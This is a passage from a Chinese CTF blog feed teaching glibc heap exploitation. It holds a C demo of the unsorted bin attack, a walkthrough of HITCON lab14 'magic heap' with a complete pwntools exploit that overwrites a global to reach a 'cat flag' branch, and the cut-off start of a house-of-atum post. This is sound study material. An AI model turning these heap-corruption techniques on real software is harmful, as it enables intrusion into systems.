class="built_in">int</span> main()&#123;</span><br><span class="line">fprintf(stderr, <span class="string">&quot;这个文件通过写入一个很大的无符号长整型的值到栈上演示了unsorted_bin_attack\n&quot;</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;在实践中, unsorted bin attack 一般是为了进一步攻击做准备, 例如重新写&quot;</span></span><br><span class="line">   <span class="string">&quot;在libc中全局的变量global_max_fast为了进一步的fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">unsigned long stack_var=<span class="number">0</span>;</span><br><span class="line">fprintf(stderr, <span class="string">&quot;让我们先来看我们想要重新写入的目标栈:\n&quot;</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">unsigned long *p=malloc(<span class="number">400</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;现在, 我们首先在堆中分配一个正常的chunk,该chunk的地址为: %p\n&quot;</span>,p);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;同时分配另一个正常的chunk,为了防止第一个申请的chunk在free()期间与top chunk合并\n\n&quot;</span>);</span><br><span class="line">malloc(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">free(p);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;现在我们释放第一个chunk,并且它将被插入unsorted bin中,它的指针指向的地址为: %p\n&quot;</span>,(void*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">//------------VULNERABILITY-----------</span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(unsigned long)(&amp;stack_var-<span class="number">2</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;现在模拟一个能修改victim-&gt;bk指针的漏洞\n&quot;</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;我们用 目标栈地址-16的值(在32-bit机器中,它应该是 目标栈地址-8):%p\n\n&quot;</span>,(void*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">//------------------------------------</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">400</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;让我们再一次申请,从而得到我们刚刚释放的chunk. 在这期间, 目标栈已经被重写\n&quot;</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (void*)stack_var);</span><br><span class="line">&#125;</span><br><span class="line">//在ubuntu16<span class="number">.04</span>环境下编译该程序</span><br><span class="line">//gcc -o lab1 lab1.c</span><br></pre></td></tr></table></figure><ul><li>编译后我们先运行一下该程序，运行结果如下，目前的我们对<code>unsorted_bin_attack</code>的利用还是不太清楚，接下来我们就来动态调试。并且画图理解。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327104549203.png" alt="image-20250327104549203"></p><ul><li>首先我们再栈上定义了一个<code>unsigned long stack_var=0;</code>，定义完这个变量之后，先申请了一个大小为<code>400</code>的堆块。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105229873.png" alt="image-20250327105229873"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105253736.png" alt="image-20250327105253736"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105329656.png" alt="image-20250327105329656"></p><ul><li>然后为了防止之后释放堆块的时候，堆块与<code>top_chunk</code>合并，所以我们再申请了一个<code>500</code>大小的堆块。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105429255.png" alt="image-20250327105429255"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105500939.png" alt="image-20250327105500939"></p><ul><li>之后我们释放第一次申请的堆块，该堆块会被放入<code>unsorted_bin</code>中</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105604255.png" alt="image-20250327105604255"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105612020.png" alt="image-20250327105612020"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105902464.png" alt="image-20250327105902464"></p><ul><li>这时我们修改该堆块的<code>bk</code>指针，将该指针指向<code>stack_var</code>这个变量的地址。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327110343767.png" alt="image-20250327110343767"></p><ul><li>修改完之后我们再次申请这个堆块，申请后我们的栈上的<code>stack_var</code>的值就会变成<code>main_arena+88</code>的地址，并且<code>stack_var_addr+0x8</code>会指向我们刚申请回来的堆块。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327110653539.png" alt="image-20250327110653539"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327110913946.png" alt="image-20250327110913946"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327111302955.png" alt="image-20250327111302955"></p><ul><li>在实际修改<code>bk</code>指针的时候，一般<code>fd</code>指针也会被修改，但是<strong>将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系</strong></li></ul><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><ul><li>这个<code>unsorted_bin_attack</code>一般也是起到辅助作用，基本上是<code>house of</code>组合技中的一环。</li><li>接下来就介绍一下后续的利用方式<ul><li>我们通过修改循环的次数来使得程序可以执行多次循环。控制循环次数的变量一般都是在栈上。</li><li>我们通过修改<code>idx</code>的大小，增加我们申请堆块的次数。</li><li>我们可以修改 heap 中的 <code>global_max_fast</code> 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li></ul></li></ul><h1 id="unsorted_bin_attack_level_1"><a class="markdownIt-Anchor" href="#unsorted_bin_attack_level_1"></a> unsorted_bin_attack_level_1</h1><ul><li>题目来源：HITCON Training lab14 magic heap</li><li>题目附件：上网搜一下就有</li><li>直接使用<code>glibc-all-in-one</code>项目配合<code>patchelf</code></li><li>考点：<code>堆溢出</code>、<code>unsorted_bin_attack</code></li></ul><h2 id="level_1_分析1"><a class="markdownIt-Anchor" href="#level_1_分析1"></a> level_1_分析1</h2><ul><li>先<code>check</code>一下保护机制。发现如下图所示的保护机制。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327114958605.png" alt="image-20250327114958605"></p><ul><li>然后运行一下程序查看一下程序的具体逻辑。一开始还是一个经典堆菜单的题目。<code>add</code>、<code>edit</code>、<code>dele</code>、<code>exit</code>这三个。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115035136.png" alt="image-20250327115035136"></p><ul><li>我们选择<code>1</code>后的具体执行过程。分别输入<code>选择</code>、<code>大小</code>、<code>内容</code></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115149367.png" alt="image-20250327115149367"></p><ul><li>选择<code>2</code>后的具体执行过程。分别输入<code>选择</code>、<code>索引</code>、<code>大小</code>、<code>内容</code></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115232672.png" alt="image-20250327115232672"></p><ul><li>选择<code>3</code>后具体执行的过程。分别输入<code>选择</code>、<code>索引</code></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115313844.png" alt="image-20250327115313844"></p><ul><li>选择<code>4</code>就直接退出</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115346749.png" alt="image-20250327115346749"></p><ul><li>接下来我们反编译一下这个程序，查看程序的具体执行逻辑。接下来我们来查看一下这个程序反编译后的<code>main</code>函数的具体执行逻辑。</li><li>该程序先是对输入、输出进行初始化，初始化之后进入两个循环。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327202821811.png" alt="image-20250327202821811"></p><ul><li>然后接下去查看，接下去的程序逻辑才是比较重要的。<ul><li>程序先会输出我们之前看到的菜单，然后让用户做出选择。</li><li><code>1</code>就是创建一个堆块，<code>2</code>就是修改一个堆块，<code>3</code>就是删除堆块。</li><li><strong>注意这边我们还看到了一个<code>4869</code>选项，这边选项会判断<code>magic</code>是否大于<code>0x1305</code>，如果大于就会执行<code>l33t()</code>函数</strong></li></ul></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327203011584.png" alt="image-20250327203011584"></p><ul><li>而<code>l33t()</code>这个函数是执行的就是<code>cat flag</code>的命令操作。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327203228885.png" alt="image-20250327203228885"></p><ul><li>接下来我们就查看<code>add()</code>、<code>delete()</code>、<code>edit()</code>这三个函数。</li><li>先来查看<code>add()</code>这个函数<ul><li>这个函数先会判断<code>heaparray</code>这个全局变量的数组里面的元素是不是空的，这个数组就是一个指针数组，存放着<code>malloc()</code>返回的堆地址。</li><li>然后会让用户输入要申请堆块的大小，申请堆块的大小后程序就会让用户向刚申请的堆块写入数据。这里不存在堆溢出。</li></ul></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327203337420.png" alt="image-20250327203337420"></p><ul><li>现在我们查看<code>delete()</code>函数，这个函数的具体执行逻辑如下。<ul><li>程序先会让用户输入要释放的堆块对应的索引。</li><li>用户输入后，程序会判断是否超出索引范围，并判断这个索引是否存放有堆块。</li><li>如果存放有堆块就会释放对应索引的堆块，然后将对应索引的位置设置为<code>0</code></li><li>注意：<strong>这里不存在<code>UAF</code>漏洞</strong></li></ul></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327203742940.png" alt="image-20250327203742940"></p><ul><li>最后我们来查看<code>edit()</code>函数</li><li>这个函数基本上也会让用户输入指定索引，然后判断索引是否超出范围</li><li>注意：<strong>这里程序可以让用户指定输入的大小，所以用户就可以指定输入比较大的值，从而造成堆溢出操作</strong></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327204038082.png" alt="image-20250327204038082"></p><h2 id="level_1_分析2"><a class="markdownIt-Anchor" href="#level_1_分析2"></a> level_1_分析2</h2><ul><li>这题的利用也就比较明显了，我们先申请三个堆块。利用方式其实就是<code>unsorted_bin_attack</code>，所以我们就要通过漏洞去修改处于<code>unsorted_bin</code>中的堆块对应的<code>bk</code>指针。</li><li>所以我们一开始需要申请<code>3</code>个堆块，按申请的顺序分别命名为<code>chunk0</code>、<code>chunk1</code>、<code>chunk2</code>。<ul><li>其中<code>chunk0</code>的作用是用于从而修改<code>chunk1的bk</code>指针。</li><li><code>chunk1</code>的作用是用于释放，释放后其会被放入到<code>unsorted_bin</code>中，所以要申请比较大的堆块使得这个堆块并不会被放入<code>fastbin</code>链表中。</li><li>接下来我们申请的<code>chunk2</code>是防止在释放<code>chunk1</code>时<code>chunk1</code>与<code>top_chunk</code>合并。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>这时我们再释放<code>chunk1</code>，<code>chunk1</code>就会被放入<code>unsortedbin</code>中。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327204808494.png" alt="image-20250327204808494"></p><ul><li>这时我们就要通过溢出操作修改<code>chunk1</code>的<code>bk</code>指针，在溢出的时候要注意一点就是要保持<code>chunk1</code>的<code>size</code>位不变，即size为一定要为<code>0x121</code>。否则我们再次申请堆块的时候<code>size</code>不正确可能就会导致程序崩溃。</li><li>接下来我们修改后再使用<code>malloc(0x110)</code>大小的堆块，修改完后的堆块内容如下图。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x121</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6020C0</span>-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327205749397.png" alt="image-20250327205749397"></p><ul><li>之后我们再次申请堆块，申请堆块后我们再查看<code>magic</code>这个全局变量的值，这时我们发现<code>magic</code>的值已经非常大了。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327210010119.png" alt="image-20250327210010119"></p><ul><li>之后我们再选择<code>4869</code>，这样我们就可以执行<code>cat flag</code>的命令了。我们就得到<code>flag</code>了</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327210135180.png" alt="image-20250327210135180"></p><h2 id="level_1_exp"><a class="markdownIt-Anchor" href="#level_1_exp"></a> level_1_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x121</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6020C0</span>-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4869&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：正式学习unsorted_bin_attack的利用</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-atum</title>
    <link href="http://iyheart.github.io/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/"/>
    <id>http://iyheart.github.io/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/</id>
    <published>2025-03-25T06:23:51.000Z</published>
    <updated>2025-03-26T14:01:02.433Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：<a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#211-house-of-atum">Glibc堆利用之house of系列总结 - roderick - record and learn!</a></li><li>参考博客：[House Of Atum-原理 | Pwn进你的心](<a href="https://ywhkkx.github.io/2023/03/10/House">https://ywhkkx.github.io/2023/03/10/House</a> Of Atum-原理/)</li><li>参考博客：<a href="https://bbs.kanxue.com/thread-269105.htm">原创]BCTF 2018 House of Atum分析-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></li></ul><h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1><ul><li><p>在<code>glibc2.31</code>版本之前，<code>tcache</code>的检查机制比较不太严格，在<code>glibc2.31</code>的时候才出现了<code>key</code>机制，所以在<code>glibc2.31</code>之前，实现<code>tcache double free</code>利用是非常容易的。甚至我们还可以把同一个<code>chunk</code>连续释放<code>8</code>次，第<code>8</code>次释放就会将该<code>chunk</code>放入<code>fastbin</code>中，当然此时该<code>chunk</code>本身还存留在<code>tcache</code>中。</p></li><li><p>这时我们甚至可以利用<code>UAF</code>漏洞，连续释放同一个<code>chunk</code>8次，使得该<code>chunk</code>被放入<code>fastbin</code>中，该<code>chunk</code>被放入<code>fastbin</code>的同时本身还是留在<code>tcache_bin</code>中。</p></li><li><p><code>house of atum</code>的适用范围：<code>glibc2.26——glibc2.30</code>。</p></li><li><p><code>house of atum</code>利用的前提条件：</p><ul><li>需要在<code>glibc</code>对应版本中。</li><li>需要存在<code>UAF</code>漏洞，这里的<code>UAF</code>漏洞需要满足两点，其一是：可以进行<code>double free</code>利用；其二是：<code>edit after free</code>，即该堆块被释放后还可以向这个堆块写入内容。</li></ul></li><li><p>进行<code>house of atum</code>这个利用方式之前，我们先要了解<code>tcache_bin</code>中的运行机制，而<code>tcache_bin</code>这个运行机制就不在这里多说明了，已经单独写一篇博客了。</p></li><li><p>其实最好是先学习一下<code>tcache double free</code>这个理由再来学习这个，但是问题不大。</p></li></ul><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><h2 id="实验1"><a class="markdownIt-Anchor" href="#实验1"></a> 实验1</h2><ul><li>这个利用方式在<code>how2heap</code>这个仓库中没有理由的代码，这时我们就自己写一个程序来动态调试一下程序的运行情况。</li><li>该程序的编译的<code>gcc</code>版本为<code>gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0</code>，但是由于我使用的<code>docker</code>环境中，<code>glibc2.27</code>已经打了补丁，所以我将该编译好的程序复制到<code>WSL</code>中，然后使用<code>glibc-all-in-one</code>这个项目，配合<code>patchelf</code>，这样就能得到实验的环境。</li><li>实验的源码如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>patchelf</code>完之后就可以开始进行动态调试了。我们就先申请一个堆块。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325165742613.png" alt="image-20250325165742613"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325165936179.png" alt="image-20250325165936179"></p><ul><li>然后我们先释放一次堆块，我们所申请的堆块就被放入了</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325170006658.png" alt="image-20250325170006658"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325170129245.png" alt="image-20250325170129245"></p><ul><li>这时我们再释放<code>6</code>次这个堆块，这时我们<code>tcachebins</code>中存放<code>0x20</code>大小的堆块就会被放满一样的堆块，这时我们再释放一个堆块，这个堆块就会被放入<code>fastbin</code>中。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325170231320.png" 